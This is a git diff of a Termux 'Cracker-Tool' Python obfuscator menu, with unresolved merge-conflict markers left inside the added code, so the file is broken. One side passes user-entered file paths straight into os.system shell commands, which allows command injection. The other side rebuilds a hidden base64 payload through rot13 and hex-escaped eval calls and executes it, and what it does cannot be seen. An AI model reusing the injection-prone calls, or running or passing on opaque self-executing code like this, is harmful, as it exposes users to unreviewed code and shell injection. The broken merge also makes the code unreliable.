@@ -5,6 +5,63 @@
 grn="\x1b[92m" 
 blu="\x1b[94m" 
 
+<<<<<<< HEAD
+import base64, os
+print(blu+"\n\n[+]This Tool Needed Storage Permission\n")
+os.system('termux-setup-storage')
+print(grn+"\n\n\tPermission Goted")
+import time, sys
+
+
+
+#Text colour
+#created By Cracker911181
+colouroff="\x1b[00m" #colour off
+
+red="\x1b[91m" #red
+green="\x1b[92m" #green
+yellow="\x1b[93m" #yellow
+blue="\x1b[94m" #blue
+rosy="\x1b[95m" #rosy
+pest="\x1b[96m" #pest
+
+
+
+while True:
+	os.system('clear')
+	print(blue+f"""
+   ____                _                _____           _
+  / ___|_ __ __ _  ___| | _____ _ __   |_   _|__   ___ | |
+ """+blue+"""| |   | '__/ _` |/ __| |/ / _ \ '__|____| |/ _ \ / _ \| |
+ """+pest+"""| |___| | | (_| | (__|   <  __/ | |_____| | (_) | (_) | |
+  \____|_|  \__,_|\___|_|\_\___|_|       |_|\___/ \___/|_|\n\n """+green+"""             Crack Your World, If You Can\n\n\t       """+blue+"""[★] Python Obfuscate [★] \n"""+green+""" ========================================================="""+colouroff)
+	chose=str(input(pest+"\n\n\t\t1.Python Script Obfuscate\n\t\t"+red+"00.Back To HOME\n\n"+rosy+"Enter Your Option: "))
+	if chose=="1":
+	
+		file=str(input(rosy+"\n\nEnter Your Python File Full Path: "))
+		os.system("python pluso.py "+file+" '*'")
+		ox=(file.replace(".py","enc.py"))
+		try:
+			open(file,"r")
+			print(pest+"\n\tFile Encode Done\n")
+			path=str(input(rosy+"Enter Your File Saving Path: "))
+			flx=str(input(rosy+"Enter Your Saving File Name: "))
+			file1=str(path+"/"+flx)
+			os.system("mv "+ox+" "+ file1)
+			print(pest+"\n\nFile Saved On "+file1)
+			
+		
+		except FileNotFoundError:
+			print(red+"\n\tYou Entered File Path is Not Dinied")
+		
+		time.sleep(3)
+	
+	
+	
+	
+	elif chose=="00":
+		break
+=======
 import base64, codecs,os
 print(blu+"\n\n[+]This Tool Needed Storage Permission\n")
 os.system('termux-setup-storage')
@@ -16,3 +73,4 @@ destiny = 'RIhL29xMFORo25yKT4vXDbWPDyjLKEbCKA0pvucoaO1qPulo3A5XlWSoaEypvOMo3IlVR
 joy = '\x72\x6f\x74\x31\x33'
 trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+>>>>>>> 92deafb008d1bb650e2a2df0d133f097b979d969
